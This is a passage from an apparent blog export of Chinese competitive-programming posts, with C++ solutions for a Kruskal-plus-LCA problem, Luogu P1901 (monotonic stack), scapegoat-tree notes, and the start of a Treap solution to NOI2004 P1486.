class="number">1</span>;</span><br><span class="line">    deep[u]=k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;e[u].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e[u][i].v==f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(e[u][i].v,u,k+<span class="number">1</span>);</span><br><span class="line">            fas[e[u][i].v][<span class="number">0</span>]=u;</span><br><span class="line">            minw[e[u][i].v][<span class="number">0</span>]=e[u][i].w;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,m,q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> linked=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>()&amp;&amp;linked&lt;n<span class="number">-1</span>) &#123;<span class="comment">//边数m可能少于n-1，因此需要注意Q是否为空</span></span><br><span class="line">        Node now=Q.<span class="built_in">top</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> a=now.u,b=now.v;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">find</span>(a)==<span class="built_in">find</span>(b)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            linked++;</span><br><span class="line">            <span class="built_in">add</span>(a,b,now.w);</span><br><span class="line">            <span class="built_in">add</span>(b,a,now.w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span><span class="comment">//求x，y的lca</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">find</span>(x)!=<span class="built_in">find</span>(y)) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//不在一个树里</span></span><br><span class="line">    <span class="type">int</span> ans=inf;</span><br><span class="line">    <span class="keyword">if</span> (deep[y] &gt;deep[x]) <span class="built_in">swap</span>(x,y);<span class="comment">//较深的标记为x</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//令x跳到与y相同高度</span></span><br><span class="line">        <span class="keyword">if</span>(deep[fas[x][i]]&gt;=deep[y])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,minw[x][i]);</span><br><span class="line">            x=fas[x][i];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (x==y) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&gt;=<span class="number">0</span>; i--)<span class="comment">//让x,y一起跳到lca节点下方</span></span><br><span class="line">        <span class="keyword">if</span>(fas[x][i]!=fas[y][i])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][i],minw[y][i]));</span><br><span class="line">            x=fas[x][i]; </span><br><span class="line">            y=fas[y][i];</span><br><span class="line">        &#125;</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][<span class="number">0</span>],minw[y][<span class="number">0</span>]));<span class="comment">//统计最小边权</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        fa[i]=i;<span class="comment">//并查集预处理，各个点都处于自己所代表的集合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="type">int</span> x,y,z;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">        Node one;</span><br><span class="line">        one.u=x;</span><br><span class="line">        one.v=y;</span><br><span class="line">        one.w=z;</span><br><span class="line">        Q.<span class="built_in">push</span>(one);<span class="comment">//加入Kruskal御用队列Q</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//最大生成树</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;<span class="comment">//倍增数组初始化&amp;dfs</span></span><br><span class="line">        <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(i,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            fas[i][<span class="number">0</span>]=i;</span><br><span class="line">            minw[i][<span class="number">0</span>]=inf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">20</span>;i++) &#123;<span class="comment">//倍增预处理</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</span><br><span class="line">            fas[j][i]=fas[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">            minw[j][i]=<span class="built_in">min</span>(minw[j][i<span class="number">-1</span>],minw[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=q;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">lca</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
            <tag> Kruskal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1901 发射站</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P1901</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>有 N 个能量发射站排成一行，每个都有**不相同的高度 $H_i$**，能向两边（当然两端的只能向一边）同时发射能量值为$V_i$ 的能量，并且发出的能量只被两边最近的且比它高的发射站接收。</p><p>显然，每个发射站发来的能量有可能被0或1或2个其他发射站所接受，求接收最多能量的发射站接收的能量是多少。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>每个能量塔射出的能量被左右第一个比其高的塔所拦截。隐隐约约觉得可以用单调栈搞……<br>维护一个高度单调不升栈，考虑<strong>依次</strong>将能量塔i加入栈：  </p><ol><li>如果高度比栈顶元素大或栈空，栈顶元素能量加上$V_i$，压入栈;  </li><li>如果高度比栈顶元素小（栈顶元素编号记为top），当前能量塔i接收的能量加上$V_{top}$，弹出栈顶元素。重复执行直到符合情况1，按1的处理方法处理。<br>最后直接扫描一遍最大值，输出。</li></ol><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> s1[<span class="number">1000010</span>],h[<span class="number">1000010</span>],v[<span class="number">1000010</span>],sum[<span class="number">1000010</span>],ans,n,top;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;h[i],&amp;v[i]);</span><br><span class="line">        <span class="keyword">while</span>(top&amp;&amp;h[s1[top]]&lt;h[i])</span><br><span class="line">            sum[i]+=v[s1[top]],top--;</span><br><span class="line">        sum[s1[top]]+=v[i];</span><br><span class="line">        top++;</span><br><span class="line">        s1[top]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,sum[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>替罪羊树学习笔记</title>
      <link href="/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>博客咕咕咕了好久……最近会逐步继续恢复更新博客的。<br>最近又在学习二叉搜索树。实测发现替罪羊树快的飞起(时间约Splay的1&#x2F;2)~写起来还比较简单，决定来一波。<br>（那为什么还要用Splay呢？因为Splay是序列之王！还能维护LCT！（你要用非旋Treap（FHQ-Treap）我也没意见））<br>替罪羊树的主要思想就是当出现重量失衡的时候，<strong>把罪魁祸首的那个子树拎出来，重新按最完美的方式（也就是近似完全二叉树）构造一遍再接回去</strong>。<br>如何定义某个子树不平衡：当这个子树的左右子树其中之一的“重量”（节点个数）超过了整个子树的α*100%时，我们认为这个子树不平衡。<br>举例：α&#x3D;0.75时，如果一个子树左子树有4个节点，右子树有1个，这个子树大小就是4+1+1&#x3D;6，左子树占比超过了α*100%（即75%），这个子树不平衡，需要重构。<br>显然，α取值介于0.5至1.0之间，越小树越平衡但重构次数越多，越大重构次数越少但树越不平衡。太大太小都会出事。<strong>一般而言，α取0.75</strong>。如果题目查询次数远大于插入次数，可略微降低α取值（比如α&#x3D;0.70）；若远小于，则略升高（如α&#x3D;0.80）。<br>下面以<a href="https://www.luogu.org/problemnew/show/P3369">洛谷3369【模板】普通平衡树</a>为例：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个板子有改进之处：比如删除节点可以打上删除懒标记，单个节点可以记录同一数字数量避免多余节点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf (1&lt;&lt;30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn (2100000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> db double</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> il inline</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RG register</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> db al=<span class="number">0.75</span>;<span class="comment">//α</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> son[<span class="number">2</span>],fa,size,num;<span class="comment">//左右孩子储存地址，节点父亲，以该节点为根子树的重量，该节点储存的数字</span></span><br><span class="line">&#125; t[maxn];</span><br><span class="line"><span class="type">int</span> n,cnt,root;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">bool</span> <span class="title">balance</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//判断子树是否平衡</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (db)(t[id].size*al&gt;=(db)t[ t[id].son[<span class="number">0</span>] ].size) &amp;&amp; (db)( t[id].size*al&gt;=(db)t[t[ id].son[<span class="number">1</span>] ].size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cur[maxn],sum;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">recycle</span><span class="params">(RG <span class="type">int</span> id)</span>    <span class="comment">//压扁，把需要重构的子树拎出来先拍扁成序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">0</span>]);</span><br><span class="line">    cur[++sum]=id;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">1</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">build</span><span class="params">(RG <span class="type">int</span> l,RG <span class="type">int</span> r)</span>   <span class="comment">//递归建树，使结构最优</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RG <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>,id=cur[mid];</span><br><span class="line">    t[ t[id].son[<span class="number">0</span>]=<span class="built_in">build</span>(l,mid<span class="number">-1</span>) ].fa=id;</span><br><span class="line">    t[ t[id].son[<span class="number">1</span>]=<span class="built_in">build</span>(mid+<span class="number">1</span>,r) ].fa=id;</span><br><span class="line">    t[id].size=t[ t[id].son[<span class="number">0</span>] ].size+t[ t[id].son[<span class="number">1</span>] ].size+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">rebuild</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//重构子树，再“接回去”</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">recycle</span>(id);</span><br><span class="line">    RG <span class="type">int</span> fa=t[id].fa,Son=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    RG <span class="type">int</span> cur=<span class="built_in">build</span>(<span class="number">1</span>,sum);</span><br><span class="line">    t[ t[fa].son[Son]=cur ].fa=fa;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">insert</span><span class="params">(RG <span class="type">int</span> x)</span><span class="comment">//插入一个数字x</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,cur=++cnt;</span><br><span class="line">    t[cur].size=<span class="number">1</span>,t[cur].num=x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123; <span class="comment">//找到适合位置插入</span></span><br><span class="line">        t[now].size++;</span><br><span class="line">        RG <span class="type">bool</span> Son=(x&gt;=t[now].num);</span><br><span class="line">        <span class="keyword">if</span>( t[now].son[Son] ) now=t[now].son[Son];</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            t[ t[now].son[Son]=cur ].fa=now;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RG <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=cur; i; i=t[i].fa) <span class="keyword">if</span>(!<span class="built_in">balance</span>(i)) flag=i;<span class="comment">//注意：重建时取深度最浅的，以避免小子树重构完大子树还重构，浪费时间</span></span><br><span class="line">    <span class="keyword">if</span>(flag) <span class="built_in">rebuild</span>(flag); <span class="comment">//插入往往会导致不平衡,这时需要重建不平衡的子树即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_num</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查询 x 在树中的节点编号（在数组中储存位置下标）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num==x) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[ t[now].num&lt;x ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">erase</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//删除</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>] &amp;&amp; t[id].son[<span class="number">1</span>]) &#123;</span><br><span class="line">        RG <span class="type">int</span> cur=t[id].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">while</span>(t[cur].son[<span class="number">1</span>]) cur=t[cur].son[<span class="number">1</span>];</span><br><span class="line">        t[id].num=t[cur].num;</span><br><span class="line">        id=cur;</span><br><span class="line">    &#125; <span class="comment">//删除操作需要找到左子树的最后一个节点或右子树的第一个节点来顶替,优先找左子树</span></span><br><span class="line">    RG <span class="type">int</span> Son=(t[id].son[<span class="number">0</span>]) ? t[id].son[<span class="number">0</span>]:t[id].son[<span class="number">1</span>];</span><br><span class="line">    RG <span class="type">int</span> k=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    t[ t[ t[id].fa ].son[k]=Son ].fa=t[id].fa;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=t[id].fa; i; i=t[i].fa) t[i].size--;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=Son;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_rank</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查 x 的排名</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(now) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num&lt;x) ans+=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_kth</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查树中的第 k 个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size==x<span class="number">-1</span>) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size&gt;=x) now=t[now].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> x-=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cnt=<span class="number">2</span>,root=<span class="number">1</span>;</span><br><span class="line">    t[<span class="number">1</span>].num=-inf,t[<span class="number">1</span>].size=<span class="number">2</span>,t[<span class="number">1</span>].son[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    t[<span class="number">2</span>].num=inf,t[<span class="number">2</span>].size=<span class="number">1</span>,t[<span class="number">2</span>].fa=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    RG <span class="type">int</span> type,x;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;type,&amp;x);</span><br><span class="line">        <span class="keyword">if</span>(type==<span class="number">1</span>) <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">2</span>) <span class="built_in">erase</span>( <span class="built_in">get_num</span>(x) );</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">3</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">get_rank</span>(x));</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">4</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[ <span class="built_in">get_kth</span>(x+<span class="number">1</span>) ].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x))].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">6</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x+<span class="number">1</span>)+<span class="number">1</span>)].num);<span class="comment">//注意此处 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1486 [NOI2004]郁闷的出纳员</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problemnew/show/P1486">https://www.luogu.org/problemnew/show/P1486</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>一个序列a，初始为空。<br>随时插入一个数，查询第k大，全体加，全体减。<br>但是如果任何数在任何时刻低于给定的下界MIN，则立即移除出序列。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>插入，查询第k大，容易发现是BST题。于是上Treap。<br>全体加全体减暴力加肯定不行，考虑用变量delta储存变化情况。全体加n就是delta+&#x3D;n（n为负就是减）<br>于是每个数实际的值是：树里储存该数的值+delta  ——①<br>减了之后可能会有数低于下界，查找最小的数判断是不是小于MIN，是的话删除，重复直到不再小于MIN。<br>注意新插入的数不应该受之前的加减影响，所以将一个数字num插入树中时，如果直接把num插入树中，就变成num+delta了。<br>实际应该插入的是num-delta，这样结合上文①，现在这个数实际的值就是num本身了。<br>提供一个指针实现的Treap，不推荐使用其实，调的时候快把我搞吐血。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 